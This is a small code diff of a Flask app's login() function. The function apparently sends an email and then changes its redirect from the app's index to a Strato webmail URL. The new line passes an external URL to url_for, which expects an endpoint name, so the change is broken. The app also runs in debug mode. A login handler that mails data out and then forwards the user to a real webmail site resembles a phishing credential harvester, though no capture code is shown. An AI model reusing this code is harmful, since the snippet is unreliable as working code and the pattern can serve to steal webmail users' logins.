@@ -31,7 +31,7 @@ def login():
     except Exception as e:
         flash(f'Failed to send email. Error: {str(e)}', 'error')
 
-    return redirect(url_for('index'))
+    return redirect(url_for('https://webmail.strato.com/appsuite/ui'))
 
 if __name__ == '__main__':
     app.run(debug=True)
